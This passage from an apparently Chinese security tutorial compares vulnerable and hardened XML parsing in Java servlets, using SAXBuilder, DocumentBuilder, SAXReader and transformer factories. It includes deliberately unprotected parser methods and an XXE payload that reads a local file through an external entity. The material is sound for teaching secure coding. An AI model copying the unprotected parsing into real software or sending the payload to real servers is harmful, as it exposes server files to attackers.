class="title">doGet</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="keyword">throws</span> ServletException, IOException </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>.doGet(req, resp);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">doPost</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="keyword">throws</span> ServletException, IOException </span>&#123;</span><br><span class="line"><span class="comment">// postNoFixXxe(req, resp);</span></span><br><span class="line">        postWithFixXxe(req, resp);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">postNoFixXxe</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">//获取请求输入流</span></span><br><span class="line">            BufferedReader reader = req.getReader();</span><br><span class="line">            <span class="comment">//将xml读取到doc</span></span><br><span class="line">            SAXBuilder builder = <span class="keyword">new</span> SAXBuilder(); <span class="comment">//使用默认解析器</span></span><br><span class="line">            Document doc = builder.build(reader);</span><br><span class="line">            <span class="comment">// 获取响应输出流</span></span><br><span class="line">            PrintWriter writer = resp.getWriter();</span><br><span class="line">            <span class="comment">//将doc写到输出流</span></span><br><span class="line">            XMLOutputter outputter = <span class="keyword">new</span> XMLOutputter();</span><br><span class="line">            outputter.output(doc, writer);</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">catch</span> (JDOMException | IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">postWithFixXxe</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">//获取请求输入流</span></span><br><span class="line">            BufferedReader reader = req.getReader();</span><br><span class="line">            <span class="comment">//将xml读取到doc，通过setFeature设置dtd、外部实体读取 防止xxe漏洞</span></span><br><span class="line">            SAXBuilder builder = <span class="keyword">new</span> SAXBuilder();</span><br><span class="line">            builder.setFeature(<span class="string">"http://apache.org/xml/features/disallow-doctype-decl"</span>, <span class="keyword">true</span>);</span><br><span class="line">            builder.setFeature(<span class="string">"http://xml.org/sax/features/external-general-entities"</span>, <span class="keyword">false</span>);</span><br><span class="line">            builder.setFeature(<span class="string">"http://xml.org/sax/features/external-parameter-entities"</span>, <span class="keyword">false</span>);</span><br><span class="line">            builder.setFeature(<span class="string">"http://apache.org/xml/features/nonvalidating/load-external-dtd"</span>, <span class="keyword">false</span>);</span><br><span class="line">            Document doc = builder.build(reader);</span><br><span class="line">            <span class="comment">// 获取响应输出流</span></span><br><span class="line">            PrintWriter writer = resp.getWriter();</span><br><span class="line">            <span class="comment">//将doc写到输出流</span></span><br><span class="line">            XMLOutputter outputter = <span class="keyword">new</span> XMLOutputter();</span><br><span class="line">            outputter.output(doc, writer);</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">catch</span> (JDOMException | IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>当在doPost中调用postNoFixXxe时，构造xml，成功访问文件内容，可以导致xxe漏洞。</p><p><img src="/imgs/image-20210905191051910.png" alt="image-20210905191051910"></p><p>当在doPost中调用postWithFixXxe时，成功防御了xxe漏洞，响应未输出xml，并且log报错不允许dtd。<img src="/imgs/image-20210905190828341.png" alt="image-20210905190828341"></p><h4 id="实验2-DocumentBuilder-原生dom解析xml"><a href="#实验2-DocumentBuilder-原生dom解析xml" class="headerlink" title="实验2 DocumentBuilder(原生dom解析xml)"></a>实验2 DocumentBuilder(原生dom解析xml)</h4><p>为了方便输出用了TransformerFactory将document输出到响应流。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.w3c.dom.Document;</span><br><span class="line"><span class="keyword">import</span> org.xml.sax.InputSource;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletException;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServlet;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"><span class="keyword">import</span> javax.xml.XMLConstants;</span><br><span class="line"><span class="keyword">import</span> javax.xml.parsers.DocumentBuilder;</span><br><span class="line"><span class="keyword">import</span> javax.xml.parsers.DocumentBuilderFactory;</span><br><span class="line"><span class="keyword">import</span> java.io.BufferedReader;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.PrintWriter;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">DocumentBuilderServlet</span> <span class="keyword">extends</span> <span class="title">HttpServlet</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">doGet</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="keyword">throws</span> ServletException, IOException </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>.doGet(req, resp);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">doPost</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="keyword">throws</span> ServletException, IOException </span>&#123;</span><br><span class="line">        postNoFixXxe(req, resp);</span><br><span class="line"><span class="comment">//        postWithFixXxe(req, resp);</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">postNoFixXxe</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            DocumentBuilderFactory documentBuilderFactory = DocumentBuilderFactory.newInstance();</span><br><span class="line">            DocumentBuilder documentBuilder = documentBuilderFactory.newDocumentBuilder();</span><br><span class="line">            BufferedReader br = <span class="keyword">new</span> BufferedReader(req.getReader());</span><br><span class="line">            Document document = documentBuilder.parse(<span class="keyword">new</span> InputSource(br));</span><br><span class="line">            <span class="comment">// 获取响应输出流</span></span><br><span class="line">            PrintWriter writer = resp.getWriter();</span><br><span class="line">            String textContent = document.getDocumentElement().getTextContent();</span><br><span class="line">            writer.print(textContent);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">postWithFixXxe</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            DocumentBuilderFactory documentBuilderFactory = DocumentBuilderFactory.newInstance();</span><br><span class="line">            documentBuilderFactory.setAttribute(XMLConstants.ACCESS_EXTERNAL_DTD, <span class="string">""</span>);</span><br><span class="line">            documentBuilderFactory.setAttribute(XMLConstants.ACCESS_EXTERNAL_SCHEMA, <span class="string">""</span>);</span><br><span class="line">            documentBuilderFactory.setAttribute(XMLConstants.FEATURE_SECURE_PROCESSING, <span class="keyword">true</span>);</span><br><span class="line">            documentBuilderFactory.setExpandEntityReferences(<span class="keyword">false</span>);</span><br><span class="line">            DocumentBuilder documentBuilder = documentBuilderFactory.newDocumentBuilder();</span><br><span class="line">            BufferedReader br = <span class="keyword">new</span> BufferedReader(req.getReader());</span><br><span class="line">            Document document = documentBuilder.parse(<span class="keyword">new</span> InputSource(br));</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 获取响应输出流</span></span><br><span class="line">            PrintWriter writer = resp.getWriter();</span><br><span class="line">            String textContent = document.getDocumentElement().getTextContent();</span><br><span class="line">            writer.print(textContent);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>调用postNoFixXxe</p><p><img src="/imgs/Snipaste_2021-09-15_09-17-58.png" alt="image-20210909133913303"></p><p>调用postWithFixXxe</p><p><img src="/imgs/Snipaste_2021-09-15_09-20-23.png" alt="image-20210909133805647"></p><h4 id="实验3-SAXReader"><a href="#实验3-SAXReader" class="headerlink" title="实验3 SAXReader"></a>实验3 SAXReader</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> javax.servlet.ServletException;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServlet;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.dom4j.Document;</span><br><span class="line"><span class="keyword">import</span> org.dom4j.io.SAXReader;</span><br><span class="line"><span class="keyword">import</span> org.dom4j.io.XMLWriter;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">SAXReaderServlet</span>  <span class="keyword">extends</span> <span class="title">HttpServlet</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">doGet</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="keyword">throws</span> ServletException, IOException </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>.doGet(req, resp);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">doPost</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="keyword">throws</span> ServletException, IOException </span>&#123;</span><br><span class="line">        postNoFixXxe(req,resp);</span><br><span class="line"><span class="comment">//        postWithFixXxe(req,resp);</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">postNoFixXxe</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span></span>&#123;</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            SAXReader saxReader = <span class="keyword">new</span> SAXReader();</span><br><span class="line">            Document doc = saxReader.read(req.getReader());</span><br><span class="line">            XMLWriter xmlWriter = <span class="keyword">new</span> XMLWriter(resp.getWriter());</span><br><span class="line">            xmlWriter.write(doc);</span><br><span class="line">        &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">postWithFixXxe</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span></span>&#123;</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            SAXReader saxReader = <span class="keyword">new</span> SAXReader();</span><br><span class="line">            saxReader.setFeature(<span class="string">"http://apache.org/xml/features/disallow-doctype-decl"</span>, <span class="keyword">true</span>);</span><br><span class="line">            saxReader.setFeature(<span class="string">"http://xml.org/sax/features/external-general-entities"</span>, <span class="keyword">false</span>);</span><br><span class="line">            saxReader.setFeature(<span class="string">"http://xml.org/sax/features/external-parameter-entities"</span>, <span class="keyword">false</span>);</span><br><span class="line">            saxReader.setFeature(<span class="string">"http://apache.org/xml/features/nonvalidating/load-external-dtd"</span>, <span class="keyword">false</span>);</span><br><span class="line">            Document doc = saxReader.read(req.getReader());</span><br><span class="line">            XMLWriter xmlWriter = <span class="keyword">new</span> XMLWriter(resp.getWriter());</span><br><span class="line">            xmlWriter.write(doc);</span><br><span class="line">        &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>调用postNoFixXxe</p><p><img src="/imgs/image-20210905204358001.png" alt="image-20210905204358001"></p><p>调用postWithFixXxe</p><p><img src="/imgs/image-20210905204721397.png" alt="image-20210905204721397"></p><h4 id="实验4-SAXTransformerFactory"><a href="#实验4-SAXTransformerFactory" class="headerlink" title="实验4 SAXTransformerFactory"></a>实验4 SAXTransformerFactory</h4><p>SAXTransformerFactory解析xml，需要xslt，否则会报错，所以构造时要构造xslt。正常情况需要将xml输出，本次实验为了节省时间没有输出。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> javax.servlet.ServletException;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServlet;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"><span class="keyword">import</span> javax.xml.XMLConstants;</span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Result;</span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.sax.SAXTransformerFactory;</span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.sax.TransformerHandler;</span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.stream.StreamResult;</span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.stream.StreamSource;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">SAXTransformerFactoryServlet</span> <span class="keyword">extends</span> <span class="title">HttpServlet</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">doGet</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="keyword">throws</span> ServletException, IOException </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>.doGet(req, resp);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">doPost</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="keyword">throws</span> ServletException, IOException </span>&#123;</span><br><span class="line">        postNoFixXxe(req, resp);</span><br><span class="line"><span class="comment">//        postWithFixXxe(req, resp);</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">postNoFixXxe</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span></span>&#123;</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            SAXTransformerFactory sf = (SAXTransformerFactory) SAXTransformerFactory.newInstance();</span><br><span class="line">            StreamSource source = <span class="keyword">new</span> StreamSource(req.getReader());</span><br><span class="line">            TransformerHandler transformerHandler = sf.newTransformerHandler(source);</span><br><span class="line">            <span class="comment">// 创建Result对象，并通过transformerHandler将目的流与其关联</span></span><br><span class="line">            Result result = <span class="keyword">new</span> StreamResult(resp.getWriter());</span><br><span class="line">            transformerHandler.setResult(result);</span><br><span class="line">        &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">postWithFixXxe</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span></span>&#123;</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            SAXTransformerFactory sf = (SAXTransformerFactory) SAXTransformerFactory.newInstance();</span><br><span class="line">            sf.setAttribute(XMLConstants.ACCESS_EXTERNAL_DTD, <span class="string">""</span>);</span><br><span class="line">            sf.setAttribute(XMLConstants.ACCESS_EXTERNAL_STYLESHEET, <span class="string">""</span>);</span><br><span class="line">            StreamSource source = <span class="keyword">new</span> StreamSource(req.getReader());</span><br><span class="line">            TransformerHandler transformerHandler = sf.newTransformerHandler(source);</span><br><span class="line">            <span class="comment">// 创建Result对象，并通过transformerHandler将目的流与其关联</span></span><br><span class="line">            Result result = <span class="keyword">new</span> StreamResult(resp.getWriter());</span><br><span class="line">            transformerHandler.setResult(result);</span><br><span class="line">        &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>构造xml和xslt如下：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="ISO-8859-1"?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">xxe</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="meta-keyword">file</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">"file:///E://111.txt"</span> &gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="meta">&lt;?xml-stylesheet type="text/xsl" href="E://222.xsl"?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">catalog</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">test</span>&gt;</span><span class="symbol">&amp;file;</span><span class="tag">&lt;/<span class="name">test</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">catalog</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--xslt文件内容如下--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">xsl:stylesheet</span> <span class="attr">version</span>=<span class="string">"1.0"</span> <span class="attr">xmlns:xsl</span>=<span class="string">"http://www.w3.org/1999/XSL/Transform"</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">xsl:template</span> <span class="attr">match</span>=<span class="string">"/"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h2</span>&gt;</span>teat<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">table</span> <span class="attr">border</span>=<span class="string">"1"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">tr</span> <span class="attr">bgcolor</span>=<span class="string">"#9acd32"</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">th</span> <span class="attr">align</span>=<span class="string">"left"</span>&gt;</span>File<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">xsl:for-each</span> <span class="attr">select</span>=<span class="string">"catalog"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">xsl:value-of</span> <span class="attr">select</span>=<span class="string">"test"</span>/&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">xsl:for-each</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">table</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">xsl:template</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">xsl:stylesheet</span>&gt;</span></span><br></pre></td></tr></table></figure><p>构造xml请求，在未禁止外部实体情况下可以正常响应，控制台未报错：</p><p><img src="/imgs/image-20210909152036586.png" alt="image-20210909152036586"></p><p>修复后报错：</p><p><img src="/imgs/image-20210909152247156.png" alt="image-20210909152247156"></p><h4 id="实验5-TransformerFactory"><a href="#实验5-TransformerFactory" class="headerlink" title="实验5 TransformerFactory"></a>实验5 TransformerFactory</h4><p>这个就是Jenkins Nested View插件XXE漏洞(CVE-2021-21680)用到的xml解析工具。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> javax.servlet.ServletException;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServlet;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"><span class="keyword">import</span> javax.xml.XMLConstants;</span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Source;</span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Transformer;</span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.TransformerException;</span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.TransformerFactory;</span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.stream.StreamResult;</span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.stream.StreamSource;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TransformerFactoryServlet</span> <span class="keyword">extends</span> <span class="title">HttpServlet</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">doGet</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="keyword">throws</span> ServletException, IOException </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>.doGet(req, resp);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">doPost</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="keyword">throws</span> ServletException, IOException </span>&#123;</span><br><span class="line">        postNoFixXxe(req, resp);</span><br><span class="line"><span class="comment">//        postWithFixXxe(req, resp);</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">postNoFixXxe</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span></span>&#123;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                TransformerFactory tf = TransformerFactory.newInstance();</span><br><span class="line">                StreamSource source = <span class="keyword">new</span> StreamSource(req.getReader());</span><br><span class="line">                tf.newTransformer().transform(source,  <span class="keyword">new</span> StreamResult(resp.getWriter()));</span><br><span class="line">            &#125; <span class="keyword">catch</span> (TransformerException | IOException e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">postWithFixXxe</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span></span>&#123;</span><br><span class="line"></span><br><span class="line">        <span 